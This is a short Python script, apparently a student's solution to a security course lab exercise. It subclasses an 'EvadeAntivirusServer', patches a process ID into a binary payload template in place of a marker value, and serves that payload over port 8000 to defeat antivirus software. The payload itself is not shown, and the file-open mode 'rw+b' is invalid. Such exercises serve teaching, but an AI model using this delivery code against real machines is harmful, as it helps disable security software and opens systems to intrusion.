import assemble
import server
import struct

PID_MARKER = 0x12345678
PATH = '/home/user/6/q3.template'

class SolutionServer(server.EvadeAntivirusServer):

	def get_payload(self, pid):
		with open(PATH, "rw+b") as reader:
			data = reader.read() # Read the data 
			pid_offset = data.find(struct.pack('<L',PID_MARKER), 0) # Search for the MAGIC WORD 0x12345678
			new_data = data.replace(struct.pack('<L',PID_MARKER), struct.pack('<L',pid)) # now repalce it with the pid argument
			
		return new_data # Send over the complete binary



	def print_handler(self, payload, product):
		print(product)

	def evade_antivirus(self, pid):
		self.add_payload(
			self.get_payload(pid),
			self.print_handler)


if __name__ == '__main__':
	SolutionServer().run_server(host='0.0.0.0', port=8000)

